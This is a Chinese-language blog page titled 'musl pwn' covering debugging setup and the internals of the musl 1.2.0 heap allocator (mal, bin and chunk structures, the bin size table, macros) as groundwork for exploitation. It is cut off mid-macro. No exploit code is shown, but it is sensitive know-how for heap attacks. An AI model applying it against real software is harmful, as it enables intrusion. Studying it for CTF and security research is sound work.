<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/musl-pwn/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            musl pwn | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">musl pwn</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 19:49:33</span>
        <span class="mobile">2024-11-08 19:49:33</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-20 03:33:40</span>
            <span class="mobile">2024-11-20 03:33:40</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-user-pwn/">linux user pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-user-pwn/">linux user pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>15.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>78 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h1><h2 id="debug-musl"><a href="#debug-musl" class="headerlink" title="debug musl"></a>debug musl</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/debug_musl" >debug_musl<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可以源码调试。<br>运行 <code>setup.sh</code> 将源码及相关动态链接库解压到根目录下 <code>musl</code> 文件夹下，用的时候只需要将对应版本的 <code>libc.so</code> 文件复制到目录下，然后利用 patchelf 运行如下命令修改可执行文件所依赖的 ld 为 <code>libc.so</code> 即可进行源码调试。 </p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./libc.so ./pwn</span><br></pre></td></tr></table></figure></div>

<p>另外该项目中的 <code>build.sh</code> 可以自动下载和编译 musl 到根目录下的 <code>musl</code> 文件夹中，建议在 ubuntu16.04 下编译。</p>
<h2 id="muslheap"><a href="#muslheap" class="headerlink" title="muslheap"></a>muslheap</h2><p>还有一个 gdb 插件 <a class="link"   target="_blank" rel="noopener" href="https://github.com/xf1les/muslheap" >muslheap<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可以在使用调试版的 <code>libc.so</code> 时打印堆信息。安装命令如下：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/xf1les/muslheap.git</span></span><br><span class="line">echo <span class="string">&quot;source /path/to/muslheap.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></div>

<p>muslheap 插件支持如下命令：</p>
<ul>
<li>mchunkinfo: Examine a mallocng-allocated memory (slot)</li>
<li>mfindslot: Find out the slot where the given memory is inside</li>
<li>mheapinfo: Display mallocng allocator internal information</li>
<li>mmagic: Display the location of important functions and sensitive variables in musl libc</li>
</ul>
<h1 id="源码阅读环境搭建"><a href="#源码阅读环境搭建" class="headerlink" title="源码阅读环境搭建"></a>源码阅读环境搭建</h1><p>在阅读 musl 代码时可以借助 <a class="link"   target="_blank" rel="noopener" href="https://www.jetbrains.com/clion/" >clion<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 进行代码分析，不过要想让 clion 正确分析 musl 代码需要进行如下配置：</p>
<p>首先最好将 musl 的源码解压到另一个目录下而不是复用前面调试环境用的源码，因为如果在阅读代码时改变了源码的格式会造成调试的时候代码对应错误。</p>
<p>在用 clion 打开 musl 源码后首先在 Mskefile 设置中配置如下命令，注意一定要点命令窗口左上角的箭头将窗口展开后再粘贴，否则格式会出现错误。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/a161e46807709141532c7359c446df73.png"
                     
                ></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># GNU Autotools template, feel free to customize.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span></span></span><br></pre></td></tr></table></figure></div>

<p>在构建窗口右键点击重新加载 Makefile 项目。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/71b255162ba4fa0aacdf2b8c866e498b.png"
                     
                ><br>中间弹出的窗口不选择清理项目即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/4b836efc96472420ba7752ecc4c49699.png"
                     
                ><br>此时 clion 虽然可以分析代码，但是分析的不完全，比如下图中的类型就找不到。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/7cb1784e6a7e38c10aca8d31d36829c8.png"
                     
                ><br>将代码编译一下后就可以正常识别。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/f34147490ba5326506e6897e5a85647d.png"
                     
                ><br>此时 clion 已经可以正常分析代码，比如结构体中成员的大小和偏移都可以分析出来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/73e29def8928117dc98c8825e36ce7a3.png"
                     
                ></p>
<h1 id="musl-heap-musl-1-2-0"><a href="#musl-heap-musl-1-2-0" class="headerlink" title="musl heap (musl-1.2.0)"></a>musl heap (musl-1.2.0)</h1><p>musl libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），其余版本之间变化不大，这里以 1.2.0 版本为例进行分析。</p>
<h2 id="基本数据结构"><a href="#基本数据结构" class="headerlink" title="基本数据结构"></a>基本数据结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/4fd3cac91e50e4115e7bba510fb30cb0.png"
                     
                ></p>
<h3 id="mal"><a href="#mal" class="headerlink" title="mal"></a>mal</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure></div>

<p><code>mal</code> 结构体类似于 glibc 中的 <code>arena</code> ，记录着堆的状态，有三个成员：64位无符号整数 <code>binmap</code> ，链表头部数组 <code>bins</code> 和锁 <code>free_lock</code> 。</p>
<ul>
<li><p><code>binmap</code>记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p>
</li>
<li><p><code>bins[64]</code> 为 64 个 <code>chunk</code> 的链表头，分别维护 64 个存放空闲 <code>chunk</code> 的双向链表。每个下标对应的链表存放 <code>chunk</code> 的大小范围如下。</p>
<table>
<thead>
<tr>
<th>index</th>
<th>min size</th>
<th>max size (+0x1F)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x20</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x40</td>
<td>0x40</td>
</tr>
<tr>
<td>2</td>
<td>0x60</td>
<td>0x60</td>
</tr>
<tr>
<td>3</td>
<td>0x80</td>
<td>0x80</td>
</tr>
<tr>
<td>4</td>
<td>0xa0</td>
<td>0xa0</td>
</tr>
<tr>
<td>5</td>
<td>0xc0</td>
<td>0xc0</td>
</tr>
<tr>
<td>6</td>
<td>0xe0</td>
<td>0xe0</td>
</tr>
<tr>
<td>7</td>
<td>0x100</td>
<td>0x100</td>
</tr>
<tr>
<td>8</td>
<td>0x120</td>
<td>0x120</td>
</tr>
<tr>
<td>9</td>
<td>0x140</td>
<td>0x140</td>
</tr>
<tr>
<td>10</td>
<td>0x160</td>
<td>0x160</td>
</tr>
<tr>
<td>11</td>
<td>0x180</td>
<td>0x180</td>
</tr>
<tr>
<td>12</td>
<td>0x1a0</td>
<td>0x1a0</td>
</tr>
<tr>
<td>13</td>
<td>0x1c0</td>
<td>0x1c0</td>
</tr>
<tr>
<td>14</td>
<td>0x1e0</td>
<td>0x1e0</td>
</tr>
<tr>
<td>15</td>
<td>0x200</td>
<td>0x200</td>
</tr>
<tr>
<td>16</td>
<td>0x220</td>
<td>0x220</td>
</tr>
<tr>
<td>17</td>
<td>0x240</td>
<td>0x240</td>
</tr>
<tr>
<td>18</td>
<td>0x260</td>
<td>0x260</td>
</tr>
<tr>
<td>19</td>
<td>0x280</td>
<td>0x280</td>
</tr>
<tr>
<td>20</td>
<td>0x2a0</td>
<td>0x2a0</td>
</tr>
<tr>
<td>21</td>
<td>0x2c0</td>
<td>0x2c0</td>
</tr>
<tr>
<td>22</td>
<td>0x2e0</td>
<td>0x2e0</td>
</tr>
<tr>
<td>23</td>
<td>0x300</td>
<td>0x300</td>
</tr>
<tr>
<td>24</td>
<td>0x320</td>
<td>0x320</td>
</tr>
<tr>
<td>25</td>
<td>0x340</td>
<td>0x340</td>
</tr>
<tr>
<td>26</td>
<td>0x360</td>
<td>0x360</td>
</tr>
<tr>
<td>27</td>
<td>0x380</td>
<td>0x380</td>
</tr>
<tr>
<td>28</td>
<td>0x3a0</td>
<td>0x3a0</td>
</tr>
<tr>
<td>29</td>
<td>0x3c0</td>
<td>0x3c0</td>
</tr>
<tr>
<td>30</td>
<td>0x3e0</td>
<td>0x3e0</td>
</tr>
<tr>
<td>31</td>
<td>0x400</td>
<td>0x400</td>
</tr>
<tr>
<td>32</td>
<td>0x420</td>
<td>0x420</td>
</tr>
<tr>
<td>33</td>
<td>0x440</td>
<td>0x520</td>
</tr>
<tr>
<td>34</td>
<td>0x540</td>
<td>0x620</td>
</tr>
<tr>
<td>35</td>
<td>0x640</td>
<td>0x720</td>
</tr>
<tr>
<td>36</td>
<td>0x740</td>
<td>0x820</td>
</tr>
<tr>
<td>37</td>
<td>0x840</td>
<td>0xa20</td>
</tr>
<tr>
<td>38</td>
<td>0xa40</td>
<td>0xc20</td>
</tr>
<tr>
<td>39</td>
<td>0xc40</td>
<td>0xe20</td>
</tr>
<tr>
<td>40</td>
<td>0xe40</td>
<td>0x1020</td>
</tr>
<tr>
<td>41</td>
<td>0x1040</td>
<td>0x1420</td>
</tr>
<tr>
<td>42</td>
<td>0x1440</td>
<td>0x1820</td>
</tr>
<tr>
<td>43</td>
<td>0x1840</td>
<td>0x1c20</td>
</tr>
<tr>
<td>44</td>
<td>0x1c40</td>
<td>0x2020</td>
</tr>
<tr>
<td>45</td>
<td>0x2040</td>
<td>0x2820</td>
</tr>
<tr>
<td>46</td>
<td>0x2840</td>
<td>0x3020</td>
</tr>
<tr>
<td>47</td>
<td>0x3040</td>
<td>0x3820</td>
</tr>
<tr>
<td>48</td>
<td>0x3840</td>
<td>0x4020</td>
</tr>
<tr>
<td>49</td>
<td>0x4040</td>
<td>0x5020</td>
</tr>
<tr>
<td>50</td>
<td>0x5040</td>
<td>0x6020</td>
</tr>
<tr>
<td>51</td>
<td>0x6040</td>
<td>0x7020</td>
</tr>
<tr>
<td>52</td>
<td>0x7040</td>
<td>0x8020</td>
</tr>
<tr>
<td>53</td>
<td>0x8040</td>
<td>0xa020</td>
</tr>
<tr>
<td>54</td>
<td>0xa040</td>
<td>0xc020</td>
</tr>
<tr>
<td>55</td>
<td>0xc040</td>
<td>0xe020</td>
</tr>
<tr>
<td>56</td>
<td>0xe040</td>
<td>0x10020</td>
</tr>
<tr>
<td>57</td>
<td>0x10040</td>
<td>0x14020</td>
</tr>
<tr>
<td>58</td>
<td>0x14040</td>
<td>0x18020</td>
</tr>
<tr>
<td>59</td>
<td>0x18040</td>
<td>0x1c020</td>
</tr>
<tr>
<td>60</td>
<td>0x1c040</td>
<td>0x20020</td>
</tr>
<tr>
<td>61</td>
<td>0x20040</td>
<td>0x28020</td>
</tr>
<tr>
<td>62</td>
<td>0x28040</td>
<td>0x30020</td>
</tr>
<tr>
<td>63</td>
<td>0x30040</td>
<td>0x38000</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>存放空闲 <code>chunk</code> 的双向链表，存放 <code>chunk</code> 从 <code>tail</code> 端放，取 <code>chunk</code> 从 <code>head</code> 端取。<br><code>bin</code> 中的 <code>head</code> 和 <code>tail</code> 初始为 0 ，但是在使用 <code>bin</code> 时一般会先调用 <code>lock_bin</code> ，此时如果 <code>bin</code> 为空会将 <code>head</code> 和 <code>tail</code> 设为 <code>&amp;bin[i] - 0x10</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">lock_bin</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    lock(mal.bins[i].lock);</span><br><span class="line">    <span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">        mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">	<span class="type">size_t</span> psize, csize;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>chunk</code> 头部结构跟 glibc 差不多，不过没有 <code>nextsize</code> 指针，<code>chunk</code> 之间不重用 <code>psize</code> 字段。<br><code>psize</code> 和 <code>csize</code> 字段都有标志位（glibc 只有 <code>size</code> 字段有），但只有一种位于最低位的标志位 <code>C_INUSE</code>（glibc 最低三位都有标志位）。若 <code>csize</code> 设置 <code>C_INUSE</code> 标志位（最低位为 1 ），表示 <code>chunk</code> 正在被使用；若没有设置 <code>C_INUSE</code> 标志位（最低位为 0 ），表示 <code>chunk</code> 已经被释放或者通过 mmap 分配的，需要通过 <code>psize</code> 的标志位来进一步判断 <code>chunk</code> 的状态。若 <code>psize</code> 设置 <code>C_INUSE</code> 标志位表示前一个 <code>chunk</code> 正在被使用。<br>另外，<code>chunk</code> 的大小关于 0x20 对齐。</p>
<h4 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h4><p><code>chunk</code> 的相关宏定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ALIGN (4*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_MASK (-SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_THRESHOLD (0x1c00*SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DONTCARE 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECLAIM 163840</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE(c) ((c)-&gt;csize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_PSIZE(c) ((c)-&gt;psize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span 